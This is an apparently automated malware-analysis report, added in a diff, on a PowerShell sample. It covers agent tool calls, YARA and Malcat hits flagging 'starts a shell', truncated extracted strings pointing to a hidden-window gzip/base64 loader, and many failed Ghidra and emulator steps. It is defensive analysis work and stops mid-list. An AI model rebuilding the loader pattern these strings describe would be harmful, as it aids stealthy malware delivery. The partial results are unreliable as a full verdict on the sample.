+            "sql": "SELECT content, address, length FROM strings ORDER BY length DESC LIMIT 30"
+          }
+        }
+      ],
+      "engine": "langgraph"
+    },
+    {
+      "step": 14,
+      "tool": null,
+      "reason": "langgraph planner tool_calls",
+      "tool_calls": [
+        {
+          "name": "ida_query",
+          "args": {
+            "sql": "SELECT content FROM strings WHERE length > 100"
+          }
+        },
+        {
+          "name": "yara_scan",
+          "args": {}
+        }
+      ],
+      "engine": "langgraph"
+    }
+  ],
+  "findings": {
+    "checklist_yara_scan": {
+      "rule_count": 5,
+      "matches": [
+        {
+          "rule": "domain",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": [
+            {
+              "id": "$domain_regex",
+              "offset": 0,
+              "length": 2,
+              "xor_key": null
+            }
+          ]
+        },
+        {
+          "rule": "powershell",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": [
+            {
+              "id": "$a",
+              "offset": 59,
+              "length": 10,
+              "xor_key": null
+            }
+          ]
+        },
+        {
+          "rule": "IP",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": [
+            {
+              "id": "$ipv6",
+              "offset": 11,
+              "length": 2,
+              "xor_key": null
+            }
+          ]
+        },
+        {
+          "rule": "contains_base64",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": [
+            {
+              "id": "$a",
+              "offset": 52,
+              "length": 16,
+              "xor_key": null
+            }
+          ]
+        },
+        {
+          "rule": "Antivirus",
+          "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "strings": []
+        }
+      ],
+      "engine": "yara-x",
+      "rules_compiled": 454,
+      "compile_errors": [
+        "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
+        "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_OmniRat.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_OmniRat.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Wshell_ChineseSpam.yar: error[E014]: invalid regular expression\n  --> /opt/samples/rules/flat/Wshell_ChineseSpam.yar:17:42\n   |\n17 |         $c = /if ?\\(\\$_POST\\[Submit\\]\\) ?{/\n   |                                          ^ unclosed counted repetition\n   |\n   = note: did you mean `\\{` instead of `{`?",
+        "/opt/samples/rules/flat/Android_FakeBank_Fanta.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_FakeBank_Fanta.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+        "/opt/samples/rules/flat/Android_AliPay_smsStealer.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_AliPay_smsStealer.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found"
+      ],
+      "incomplete": true
+    },
+    "checklist_malcat_analyze": {
+      "analysis_id": 1,
+      "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+      "profile": "deep",
+      "limits": {
+        "strings_max": 300,
+        "imports_max": 300,
+        "functions_max": 30,
+        "anomaly_locations_max": 50,
+        "decompile_top_n": 3
+      },
+      "file_summary": {
+        "analysis_id": 1,
+        "file_name": "3048.ps1",
+        "file_path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+        "file_size": 2800,
+        "type": "text/utf8",
+        "architecture": "NONE",
+        "entropy": 148,
+        "sha256": "14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+        "metadata": {},
+        "entrypoint_ea": null,
+        "layout": [
+          {
+            "name": "",
+            "effective_address": 0,
+            "physical_size": 2800,
+            "virtual_size": 2800,
+            "rights": "",
+            "entropy": 148
+          }
+        ],
+        "kesakode_verdict": []
+      },
+      "views": {
+        "anomalies": [],
+        "anomaly_locations": {},
+        "yara_hits": [
+          {
+            "id": "RunShell",
+            "category": "lateral movement",
+            "reliability": 70,
+            "type": "UNCOMMON",
+            "description": "starts a shell",
+            "num_patterns": 1
+          },
+          {
+            "id": "Powershell",
+            "category": "lateral movement",
+            "reliability": 30,
+            "type": "SUSPICIOUS",
+            "description": "runs a powershell script",
+            "num_patterns": 1
+          }
+        ],
+        "strings": [
+          {
+            "ea": 75,
+            "summary": "powershell"
+          },
+          {
+            "ea": 100,
+            "summary": "powershell"
+          },
+          {
+            "ea": 1575,
+            "summary": "o7pr3d3E1k5jz02X..GAV521nIJ17x5ls7"
+          },
+          {
+            "ea": 1846,
+            "summary": "Gpbr0XQ3VYSTpa6N..K7RjgOTuuIzjddpQ"
+          },
+          {
+            "ea": 922,
+            "summary": "T3JylvqFE5qcDlZQ..8BxX0ldul5V1Ngah"
+          },
+          {
+            "ea": 1173,
+            "summary": "2hkmcF9neg5RB7Ja..gNN9JfmZNyjAfv3v"
+          },
+          {
+            "ea": 775,
+            "summary": "P3VqrGPCxLhlhYXO..vUr8SyWQmhdZowlJ"
+          },
+          {
+            "ea": 2159,
+            "summary": "7F96i2Gg0GWOMwld..QKGJS8cXU5oqmLUV"
+          },
+          {
+            "ea": 2364,
+            "summary": "sX3hKXG549OGzo9r..I49gUI8fvDGiZpyZ"
+          },
+          {
+            "ea": 1436,
+            "summary": "JIzORjuBW1XFNGUr..9XwoM3DpQaGhpNAC"
+          },
+          {
+            "ea": 1379,
+            "summary": "WYuJycRmqIaC0cyb..HFpK8G8ENJPljUam"
+          },
+          {
+            "ea": 1500,
+            "summary": "AraaEnCWshkAR1OD..yqRk6mZ4sh9tvdsR"
+          },
+          {
+            "ea": 1973,
+            "summary": "WZ4ZLhY3guI7s7G0..k2HoVJV9N3SWvZUI"
+          },
+          {
+            "ea": 1777,
+            "summary": "2RwaVKLc7mCSsNxE..HH6NuKI6Oev8Z3at"
+          },
+          {
+            "ea": 2027,
+            "summary": "Eo2s3vBUtuLYploi..fAfYge4eCdAvfIwo"
+          },
+          {
+            "ea": 1327,
+            "summary": "JoEvjoV91JZMDbXv..IXc2SSEI5HvQvpYH"
+          },
+          {
+            "ea": 607,
+            "summary": "611R5MNolexcoi8E..PEQ8yVlplSUvD1X3"
+          },
+          {
+            "ea": 2679,
+            "summary": "RedirectStandardOutput"
+          },
+          {
+            "ea": 409,
+            "summary": "ayBL9nEj5D9YKCaN..yGnURa6drYHkwwDz"
+          },
+          {
+            "ea": 2320,
+            "summary": "VXTTL1eqvOE8I0eJ..wy8c6oqJlKaeOxGh"
+          },
+          {
+            "ea": 1279,
+            "summary": "lU0vnCWIVFB8MI7S..VDfCvzH9olicnRhm"
+          },
+          {
+            "ea": 696,
+            "summary": "JkW7RcEve6LTvO0R..MiTPy83oAY4JfhYp"
+          },
+          {
+            "ea": 511,
+            "summary": "2aOMhRxfK28a3K18..rjhpv3sB8jQ64Xzj"
+          },
+          {
+            "ea": 483,
+            "summary": "1HVVXXqdHVv97FXkCTmQoNyv797"
+          },
+          {
+            "ea": 1741,
+            "summary": "UHz3R3ZHxwY5Hh0k..JU96hldxPZFqKB04"
+          },
+          {
+            "ea": 881,
+            "summary": "4CWlvQHtOPaD257u..795uK5oQ7SVLoPfm"
+          },
+          {
+            "ea": 1129,
+            "summary": "JmRhR7Dc5Mc7JdUncF8m5W"
+          },
+          {
+            "ea": 652,
+            "summary": "7fdx5ayuc9ojlfN8..Lp7Te4P5sMINWmWK"
+          },
+          {
+            "ea": 2074,
+            "summary": "IDsion4QRXMVBygw..hhaEOO1Cli8oxT7A"
+          },
+          {
+            "ea": 260,
+            "summary": "StreamReader"
+          },
+          {
+            "ea": 558,
+            "summary": "fhzuswzHxWXcusOFmOc42lCCc77B"
+          },
+          {
+            "ea": 2553,
+            "summary": "hPfju7f8AKrkmBB0MAAA"
+          },
+          {
+            "ea": 2529,
+            "summary": "KjBcPP5YRyPv22tirfbYv3k"
+          },
+          {
+            "ea": 150,
+            "summary": "ProcessStartInfo"
+          },
+          {
+            "ea": 2603,
+            "summary": "CompressionMode"
+          },
+          {
+            "ea": 2653,
+            "summary": "UseShellExecute"
+          },
+          {
+            "ea": 52,
+            "summary": "WindowsPowerShell"
+          },
+          {
+            "ea": 2129,
+            "summary": "bH1z1MLK3pr6ViKTDmYgGxlzs9MVK"
+          },
+          {
+            "ea": 339,
+            "summary": "MemoryStream"
+          },
+          {
+            "ea": 1153,
+            "summary": "irr6nBfFQXlTbPTQqHK"
+          },
+          {
+            "ea": 390,
+            "summary": "H4sIAAKbYF0CA7VWa4"
+          },
+          {
+            "ea": 2262,
+            "summary": "LU1Xn65QIK0ZBrcTlzhPbecnVh"
+          },
+          {
+            "ea": 2289,
+            "summary": "gQNQ"
+          },
+          {
+            "ea": 2503,
+            "summary": "CFAfzRuF5ECBE24Yii"
+          },
+          {
+            "ea": 91,
+            "summary": "else"
+          },
+          {
+            "ea": 1728,
+            "summary": "XHxWnyqBynZr"
+          },
+          {
+            "ea": 2250,
+            "summary": "Mo7IwddEbwZ"
+          },
+          {
+            "ea": 294,
+            "summary": "Compression"
+          },
+          {
+            "ea": 2447,
+            "summary": "4xLtTc9791g9bIWfph"
+          },
+          {
+            "ea": 2591,
+            "summary": "Compression"
+          },
+          {
+            "ea": 138,
+            "summary": "Diagnostics"
+          },
+          {
+            "ea": 2621,
+            "summary": "Decompress"
+          },
+          {
+            "ea": 2735,
+            "summary": "CreateNoWindow"
+          },
+          {
+            "ea": 2767,
+            "summary": "Diagnostics"
+          },
+          {
+            "ea": 1552,
+            "summary": "n3R8ujJU71sRiqM1"
+          },
+          {
+            "ea": 2789,
+            "summary": "Start"
+          },
+          {
+            "ea": 4,
+            "summary": "IntPtr"
+          },
+          {
+            "ea": 231,
+            "summary": "create"
+          },
+          {
+            "ea": 2779,
+            "summary": "Process"
+          },
+          {
+            "ea": 2296,
+            "summary": "YMX5z7b93TOsryEFGoB3AFV"
+          },
+          {
+            "ea": 33,
+            "summary": "windir"
+          },
+          {
+            "ea": 2724,
+            "summary": "Hidden"
+          },
+          {
+            "ea": 204,
+            "summary": "hidden"
+          },
+          {
+            "ea": 587,
+            "summary": "cG5Ic7w"
+          },
+          {
+            "ea": 2469,
+            "summary": "idS3SIXz8f8bry9w"
+          },
+          {
+            "ea": 217,
+            "summary": "scriptblock"
+          },
+          {
+            "ea": 170,
+            "summary": "FileName"
+          },
+          {
+            "ea": 2117,
+            "summary": "5Gx9vtUIKw5"
+          },
+          {
+            "ea": 2635,
+            "summary": "ReadToEnd"
+          },
+          {
+            "ea": 371,
+            "summary": "FromBase64String"
+          },
+          {
+            "ea": 42,
+            "summary": "sysnative"
+          },
+          {
+            "ea": 546,
+            "summary": "XkxTOYkQiR8"
+          },
+          {
+            "ea": 595,
+            "summary": "9nmEXsF9ztX"
+          },
+          {
+            "ea": 867,
+            "summary": "CpKPfH3FF"
+          },
+          {
+            "ea": 757,
+            "summary": "PcJ7Xm9w92"
+          },
+          {
+            "ea": 2486,
+            "summary": "rH4XhkLzEu9X03"
+          },
+          {
+            "ea": 445,
+            "summary": "B2dGqsRu7h"
+          },
+          {
+            "ea": 464,
+            "summary": "vfbzXgyexmskpWui2Q"
+          },
+          {
+            "ea": 185,
+            "summary": "Arguments"
+          },
+          {
+            "ea": 2711,
+            "summary": "WindowStyle"
+          },
+          {
+            "ea": 277,
+            "summary": "Object"
+          },
+          {
+            "ea": 2670,
+            "summary": "false"
+          },
+          {
+            "ea": 2522,
+            "summary": "PG9eC"
+          },
+          {
+            "ea": 2760,
+            "summary": "System"
+          },
+          {
+            "ea": 2581,
+            "summary": "System"
+          },
+          {
+            "ea": 131,
+            "summary": "System"
+          },
+          {
+            "ea": 124,
+            "summary": "Object"
+          },
+          {
+            "ea": 2441,
+            "summary": "3arKb"
+          },
+          {
+            "ea": 737,
+            "summary": "FHETD1C"
+          },
+          {
+            "ea": 690,
+            "summary": "rhMvS"
+          },
+          {
+            "ea": 1829,
+            "summary": "yJDIb"
+          },
+          {
+            "ea": 1839,
+            "summary": "T1np5e"
+          },
+          {
+            "ea": 456,
+            "summary": "Yjthkwu"
+          },
+          {
+            "ea": 361,
+            "summary": "Convert"
+          },
+          {
+            "ea": 354,
+            "summary": "System"
+          },
+          {
+            "ea": 329,
+            "summary": "System"
+          },
+          {
+            "ea": 322,
+            "summary": "Object"
+          },
+          {
+            "ea": 284,
+            "summary": "System"
+          },
+          {
+            "ea": 250,
+            "summary": "System"
+          },
+          {
+            "ea": 243,
+            "summary": "Object"
+          },
+          {
+            "ea": 1115,
+            "summary": "pCiPG9y8z0cNK"
+          },
+          {
+            "ea": 2703,
+            "summary": "true"
+          },
+          {
+            "ea": 2751,
+            "summary": "true"
+          },
+          {
+            "ea": 1374,
+            "summary": "qa0Q"
+          },
+          {
+            "ea": 745,
+            "summary": "LfB268yzxRN"
+          },
+          {
+            "ea": 306,
+            "summary": "GzipStream"
+          },
+          {
+            "ea": 915,
+            "summary": "tzH4Bk"
+          },
+          {
+            "ea": 1569,
+            "summary": "tdNWz"
+          },
+          {
+            "ea": 13,
+            "summary": "Size"
+          }
+        ],
+        "imports": [],
+        "sections": [
+          {
+            "name": "",
+            "effective_address": 0,
+            "physical_size": 2800,
+            "virtual_size": 2800,
+            "rights": "",
+            "entropy": 148
+          }
+        ],
+        "entropy": {
+          "file_entropy": 148,
+          "regions": [
+            {
+              "name": "",
+              "entropy": 148,
+              "size": null
+            }
+          ]
+        },
+        "functions": [],
+        "constants": [],
+        "carved": [],
+        "virtual_files": [],
+        "structures": []
+      },
+      "functions": [],
+      "constants": [],
+      "anomalies": [],
+      "carved_files": [],
+      "virtual_files": [],
+      "structures": [],
+      "decompilations": {},
+      "script_decompile": null,
+      "unpack_result": null,
+      "errors": []
+    },
+    "checklist_r2_decompile": {
+      "r2_ok": true,
+      "sample": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+      "disassembly": {
+        "0x00000000": "\u250c 1906: fcn.00000000 (int64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4, int64_t arg5, int64_t arg6, int64_t arg_31h, int64_t arg_32h, int64_t arg_36h, int64_t arg_41h, int64_t arg_49h, int64_t arg_4ah, int64_t arg_56h, int64_t arg_63h, int64_t arg_6ah, int64_t arg_79h);\n\u2502           ; arg int64_t arg1 @ rdi\n\u2502           ; arg int64_t arg2 @ rsi\n\u2502           ; arg int64_t arg3 @ rdx\n\u2502           ; arg int64_t arg4 @ rcx\n\u2502           ; arg int64_t arg5 @ r8\n\u2502           ; arg int64_t arg6 @ r9\n\u2502           ; arg int64_t arg_31h @ rbp+0x31\n\u2502           ; arg int64_t arg_32h @ rbp+0x32\n\u2502           ; arg int64_t arg_36h @ rbp+0x36\n\u2502           ; arg int64_t arg_41h @ rbp+0x41\n\u2502           ; arg int64_t arg_49h @ rbp+0x49\n\u2502           ; arg int64_t arg_4ah @ rbp+0x4a\n\u2502           ; arg int64_t arg_56h @ rbp+0x56\n\u2502           ; arg int64_t arg_63h @ rbp+0x63\n\u2502           ; arg int64_t arg_6ah @ rbp+0x6a\n\u2502           ; arg int64_t arg_79h @ rbp+0x79\n\u2502           0x00000000      6966285b49..   imul esp, dword [rsi + 0x28], 0x746e495b\n\u2502           0x00000007      50             push rax\n\u2502       \u250c\u2500< 0x00000008      7472           je 0x7c\n\u2502       \u2502   0x0000000a      5d             pop rbp\n\u2502       \u2502   0x0000000b      3a3a           cmp bh, byte [arg_49h]      ; arg3\n\u2502       \u2502   0x0000000d      53             push rbx\n\u2502       \u2502   0x0000000e      697a65202d..   imul edi, dword [rdx + 0x65], 0x71652d20\n\u2502       \u2502   0x00000015      203429         and byte [rcx + rbp], dh    ; arg4\n\u2502      \u250c\u2500\u2500< 0x00000018      7b24           jnp 0x3e\n\u2502      \u2502\u2502   0x0000001a      62             invalid\n..\n    \u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x1a0(w)\n\u2502  \u2502\u2502\u2502\u2502\u2514\u2500\u2500> 0x0000003e      657253         jb 0x94\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x70e(w)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x00000041      68656c6c5c     push 0x5c6c6c65             ; 'ell\\\\'\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x00000046      7631           jbe 0x79\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   0x00000048      2e305c706f     xor byte cs:[rax + rsi*2 + 0x6f], bl\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x6aa(r)\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x0000004d      7765           ja 0xb4\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x0000004f      7273           jb 0xc4\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   0x00000051      68656c6c2e     push 0x2e6c6c65             ; 'ell.'\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x00000056      657865         js 0xbe\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   0x00000059      27             invalid\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREFS from fcn.00000000 @ 0x72c(r), 0x7b7(r)\n..\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0xb3(r)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x3e4(w)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x805(w)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREFS from fcn.00000000 @ 0x606(r), 0xa5a(r)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREFS from fcn.00000000 @ 0x5a1(w), 0x9fb(w)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREFS from fcn.00000000 @ 0x43e(r), 0x440(w)\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x954(w)\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500> 0x00000079      65772d         ja 0xa9\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2514\u2500> 0x0000007c      4f             invalid\n..\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2514\u2500\u2500> 0x00000094      732e           jae 0xc4\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x00000096      50             push rax\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x00000097      726"
+      },
+      "engine": "pdf (disasm)",
+      "fallback": true,
+      "functions_attempted": [
+        "0x00000000"
+      ]
+    },
+    "checklist_xor_string_search": {
+      "xorsearch_ok": false,
+      "sample": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+      "candidates": [],
+      "xorsearch_stdout": "",
+      "xorsearch_stderr": "",
+      "xorsearch_returncode": 1
+    },
+    "anti_analysis_signals": {
+      "error": "RuntimeError: ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n"
+    },
+    "dynamic_resolve_sites": {
+      "error": "RuntimeError: ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n"
+    },
+    "emulation_oracle": {
+      "ok": false,
+      "error": "SpeakeasyError: Emulator not initialized",
+      "instructions_executed": null,
+      "executed_functions": [],
+      "dyn_import_count": null,
+      "dyn_imports": [],
+      "memory_region_count": null
+    },
+    "auto_ghidra_query_0": {
+      "error": "ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n"
+    },
+    "lg_floss_extract_7": {
+      "skipped": true,
+      "fail_open": true,
+      "reason": "not_applicable:text",
+      "error": "FLOSS supports PE only (got text)",
+      "string_count": 0,
+      "strings": [],
+      "floss_profile": "skipped",
+      "duration_s": 0.0
+    },
+    "lg_malcat_analyze_8": {
+      "analysis_id": 1,
+      "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+      "profile": "deep",
+      "limits": {
+        "strings_max": 300,
+        "imports_max": 300,
+        "functions_max": 30,
+        "anomaly_locations_max": 50,
+        "decompile_top_n": 3
+      },
+      "file_summary": {
+        "analysis_id": 1,
+        "file_name": "3048.ps1",
+        "file_path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+        "file_size": 2800,
+        "type": "text/utf8",
+        "architecture": "NONE",
+        "entropy": 148,
+        "sha256": "14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+        "metadata": {},
+        "entrypoint_ea": null,
+        "layout": [
+          {
+            "name": "",
+            "effective_address": 0,
+            "physical_size": 2800,
+            "virtual_size": 2800,
+            "rights": "",
+            "entropy": 148
+          }
+        ],
+        "kesakode_verdict": []
+      },
+      "views": {
+        "anomalies": [],
+        "anomaly_locations": {},
+        "yara_hits": [
+          {
+            "id": "RunShell",
+            "category": "lateral movement",
+            "reliability": 70,
+            "type": "UNCOMMON",
+            "description": "starts a shell",
+            "num_patterns": 1
+          },
+          {
+            "id": "Powershell",
+            "category": "lateral movement",
+            "reliability": 30,
+            "type": "SUSPICIOUS",
+            "description": "runs a powershell script",
+            "num_patterns": 1
+          }
+        ],
+        "strings": [
+          {
+            "ea": 75,
+            "summary": "powershell"
+          },
+          {
+            "ea": 100,
+            "summary": "powershell"
+          },
+          {
+            "ea": 1575,
+            "summary": "o7pr3d3E1k5jz02X..GAV521nIJ17x5ls7"
+          },
+          {
+            "ea": 1846,
+            "summary": "Gpbr0XQ3VYSTpa6N..K7RjgOTuuIzjddpQ"
+          },
+          {
+            "ea": 922,
+            "summary": "T3JylvqFE5qcDlZQ..8BxX0ldul5V1Ngah"
+          },
+          {
+            "ea": 1173,
+            "summary": "2hkmcF9neg5RB7Ja..gNN9JfmZNyjAfv3v"
+          },
+          {
+            "ea": 775,
+            "summary": "P3VqrGPCxLhlhYXO..vUr8SyWQmhdZowlJ"
+          },
+          {
+            "ea": 2159,
+            "summary": "7F96i2Gg0GWOMwld..QKGJS8cXU5oqmLUV"
+          },
+          {
+            "ea": 2364,
+            "summary": "sX3hKXG549OGzo9r..I49gUI8fvDGiZpyZ"
+          },
+          {
+            "ea": 1436,
+            "summary": "JIzORjuBW1XFNGUr..9XwoM3DpQaGhpNAC"
+          },
+          {
+            "ea": 1379,
+            "summary": "WYuJycRmqIaC0cyb..HFpK8G8ENJPljUam"
+          },
+          {
+            "ea": 1500,
+            "summary": "AraaEnCWshkAR1OD..yqRk6mZ4sh9tvdsR"
+          },
+          {
+            "ea": 1973,
+            "summary": "WZ4ZLhY3guI7s7G0..k2HoVJV9N3SWvZUI"
+          },
+          {
+            "ea": 1777,
+            "summary": "2RwaVKLc7mCSsNxE..HH6NuKI6Oev8Z3at"
+          },
+          {
+            "ea": 2027,
+            "summary": "Eo2s3vBUtuLYploi..fAfYge4eCdAvfIwo"
+          },
+          {
+            "ea": 1327,
+            "summary": "JoEvjoV91JZMDbXv..IXc2SSEI5HvQvpYH"
+          },
+          {
+            "ea": 607,
+            "summary": "611R5MNolexcoi8E..PEQ8yVlplSUvD1X3"
+          },
+          {
+            "ea": 2679,
+            "summary": "RedirectStandardOutput"
+          },
+          {
+            "ea": 409,
+            "summary": "ayBL9nEj5D9YKCaN..yGnURa6drYHkwwDz"
+          },
+          {
+            "ea": 2320,
+            "summary": "VXTTL1eqvOE8I0eJ..wy8c6oqJlKaeOxGh"
+          },
+          {
+            "ea": 1279,
+            "summary": "lU0vnCWIVFB8MI7S..VDfCvzH9olicnRhm"
+          },
+          {
+            "ea": 696,
